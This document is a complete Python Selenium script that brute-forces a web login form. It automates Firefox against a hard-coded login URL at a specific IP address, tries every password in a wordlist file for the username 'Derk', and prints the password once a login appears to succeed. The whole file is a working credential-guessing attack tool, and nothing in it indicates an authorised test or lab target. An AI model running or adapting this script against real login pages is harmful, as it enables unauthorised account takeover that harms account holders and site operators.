from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from tqdm import tqdm

LOGIN_URL = 'http://141.87.60.108:5000/login'
USERNAME = 'Derk'

ops = Options()
ops.headless = False
ff = webdriver.Firefox(options=ops)

def attempt_cred(username, password, username_selector='[name="Username"]', password_selector='[name="Password"]',
                 button_selector='[type="submit"]', success_selector=None):
    ff.get(LOGIN_URL)
    ff.find_element(By.CSS_SELECTOR, password_selector).send_keys(password)
    ff.find_element(By.CSS_SELECTOR, username_selector).send_keys(username)
    ff.find_element(By.CSS_SELECTOR, button_selector).click()
    success_selector = success_selector or password_selector
    return not len(ff.find_elements(By.CSS_SELECTOR, success_selector))

def generate_passwords():
    with open('password.txt') as fp:
        for line in fp:
            yield line.strip()

def main():
    passwords = generate_passwords()
    for password in tqdm(passwords):
        if attempt_cred(USERNAME, password):
            print("Password Found:", password)
            break

if __name__ == '__main__':
    main()